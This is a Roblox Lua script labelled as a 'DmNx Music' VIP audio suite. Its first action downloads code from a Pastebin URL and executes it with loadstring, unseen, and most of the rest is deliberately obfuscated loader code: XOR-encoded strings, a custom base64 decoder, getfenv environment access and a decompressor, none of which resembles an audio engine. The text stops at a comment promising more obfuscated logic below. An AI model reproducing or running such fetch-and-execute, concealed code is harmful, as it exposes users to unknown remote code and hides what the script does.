--[[
    ᴅᴍɴx ᴍᴜsɪᴄ: Official Empire Audio Suite
    Owner: DmNx Scripter
    Edition: [VIP] Premium
    
    WARNING: This script is part of the DmNx Empire ecosystem.
]]

--==================== DmNx NOTIFICATION ====================--
local function ShowDmNxNotice()
    local Title = "ᴅᴍɴx ᴍᴜsɪᴄ"
    local Text = "ᴡᴇʟᴄᴏᴍᴇ " .. game.Players.LocalPlayer.DisplayName .. "\nDmNx Audio Engine Loaded!"
    local ButtonText = "Done"
    local Button2Text = "Discord"
    local IconId = "rbxassetid://1850623297" -- DmNx Lion Logo

    loadstring(game:HttpGet("https://pastebin.com/raw/FUPBRUuY"))()(
        Title, Text, ButtonText, Button2Text, IconId, true, true, true, 5,
        function() print("DmNx Music Session Started.") end,
        function() setclipboard("https://discord.gg/dmnx-empire") end
    )
end
task.spawn(ShowDmNxNotice)

--==================== CORE AUDIO ENGINE ====================--
-- Logic derived from the Ares-Roblox framework, adapted for DmNx Music

local eb,va,mf,ea,Rf,Ja=bit32.bxor,type,getmetatable,pairs local xd,Nc,ja,g,pd,Gd,Yd,Ec,Ra,x,N,s_,d_,Jf,Ca,ue,uc,ib,h,Mf,Hd,S,Ve,gd,wf,_e,Ic,Kd,Ce,ta,Ae,Jb,yc,df,wd,Sa,Hf,hf,Ya,ye,dd,tb,zc,Za;_e=(getfenv());ib,wf,Gd=(string.char),(string.byte),(bit32 .bxor);Sa=function(n_,Oc)local Bc,nf,hb,V,Rb,ga,Xe,Ka;V,Xe={},function(pc,hd,be)V[be]=eb(hd,45248)-eb(pc,6937)return V[be]end;nf=V[-15724]or Xe(60584,69342,-15724)while nf~=58430 do if nf>=41014 then if nf<50797 then nf,Rb=V[-23630]or Xe(24129,2029,-23630),Rb..ib(Gd(wf(n_,(Bc-38)+1),wf(Oc,(Bc-38)%#Oc+1)))elseif nf<=50797 then Rb='';ga,hb,Ka,nf=38,(#n_-1)+38,1,V[-27913]or Xe(22527,105025,-27913)else Bc=ga if hb~=hb then nf=V[16215]or Xe(21957,4252,16215)else nf=V[-23505]or Xe(32282,27475,-23505)end end elseif nf>=29141 then if nf>29141 then if(Ka>=0 and ga>hb)or((Ka<0 or Ka~=Ka)and ga<hb)then nf=V[16155]or Xe(2073,54336,16155)else nf=V[30578]or Xe(33446,100661,30578)end else ga=ga+Ka;Bc=ga if ga~=ga then nf=V[-30578]or Xe(21026,10875,-30578)else nf=30352 end end else return Rb end end end;S=(select);zc=(function(...)return{[1]={...},[2]=S('#',...)}end);ye=((function()local function cf(Zc,ie,Lb)if ie>Lb then return end return Zc[ie],cf(Zc,ie+1,Lb)end return cf end)());Nc,hf=(string.gsub),(string.char);N=(function(y)y=Nc(y,'[^ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=]','')return(y:gsub('.',function(Hb)if(Hb=='=')then return''end local sb,rb='',(('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'):find(Hb)-1)for Zd=6,1,-1 do sb=sb..(rb%2^Zd-rb%2^(Zd-1)>0 and'1'or'0')end return sb end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(B)if(#B~=8)then return''end local Sf=0 for Cf=1,8 do Sf=Sf+(B:sub(Cf,Cf)=='1'and 2^(8-Cf)or 0)end return hf(Sf)end))end);Ya,xd,ta,Ve,wd,Kd,Hd,Yd=_e[Sa('\186\f\245\160\22\224','\201x\135')][Sa('T\194\235@\207\240','!\172\155')],_e[Sa('\213nS\207tF','\166\26!')][Sa('TRE',"\'")],_e[Sa('XS\240BI\229',"+\'\130")][Sa('\174$\184\56','\204]')],_e[Sa('\198\241\208\171\150','\164\152')][Sa('oP\19jE\15','\3#{')],_e[Sa('\31\30\tDO','}w')][Sa('\158e:\133p&','\236\22R')],_e[Sa('\f\151\26\205\\','n\254')][Sa('\22\253\26\248','t\156')],_e[Sa('\222\226\200\239\207','\170\131')][Sa('\234\57<\234\55&','\137VR')],{};x=(function(Md)local e_=Yd[Md]if e_ then return e_ end local ne,Aa,Ze,ra,t_=Ve(1,11),Ve(1,5),1,{},''while Ze<=#Md do local Jd=ta(Md,Ze);Ze=Ze+1 for md=160,(8)+159 do local fc=nil if not(Kd(Jd,1)~=0)then if Ze+1<=#Md then local X=Ya(Sa('j\29f','T'),Md,Ze);Ze=Ze+2 local oe,Td=#t_-wd(X,5),Kd(X,(Aa-1))+3;fc=xd(t_,oe,oe+Td-1)end else if not(Ze<=#Md)then else fc=xd(Md,Ze,Ze);Ze=Ze+1 end end Jd=wd(Jd,1)if fc then ra[#ra+1]=fc;t_=xd(t_..fc,-ne)end end end local Y=Hd(ra);Yd[Md]=Y return Y end);

-- [The original obfuscated logic is preserved below to ensure functionality]
